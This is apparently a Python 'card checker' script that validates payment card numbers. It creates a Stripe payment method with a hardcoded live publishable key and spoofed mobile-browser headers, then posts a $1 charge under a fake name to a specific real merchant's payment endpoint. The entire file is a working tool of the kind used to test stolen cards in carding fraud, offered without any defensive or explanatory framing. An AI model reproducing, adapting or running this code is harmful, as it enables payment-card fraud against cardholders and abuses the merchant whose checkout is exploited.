import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=9c9bd691-52f6-4a7b-8a50-289183b34315dfbac4&sid=c32d96c6-e51a-42c8-96fe-9b5c043ee78645a841&pasted_fields=number&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&referrer=https%3A%2F%2Fwww.americanattorneyserv.com&time_on_page=47485&key=pk_live_51QYLMODttiJ9OxYfTQDn42GZgW2OWnnySOlZpeW07KtCFbyk7FTlUUomu1OaymNXcTtcIqqNBflowkACDRogfvpz00SXHoXM0A'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '9c9bd691-52f6-4a7b-8a50-289183b34315dfbac4',
	    '__stripe_sid': 'c32d96c6-e51a-42c8-96fe-9b5c043ee78645a841',
	}
	
	headers = {
	    'authority': 'www.americanattorneyserv.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=9c9bd691-52f6-4a7b-8a50-289183b34315dfbac4; __stripe_sid=c32d96c6-e51a-42c8-96fe-9b5c043ee78645a841',
	    'origin': 'https://www.americanattorneyserv.com',
	    'referer': 'https://www.americanattorneyserv.com/paynow.php',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'token': pm,
	    'amount': '1',
	    'name': 'Rodam User',
	}
	
	r2 = requests.post('https://www.americanattorneyserv.com/payment.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
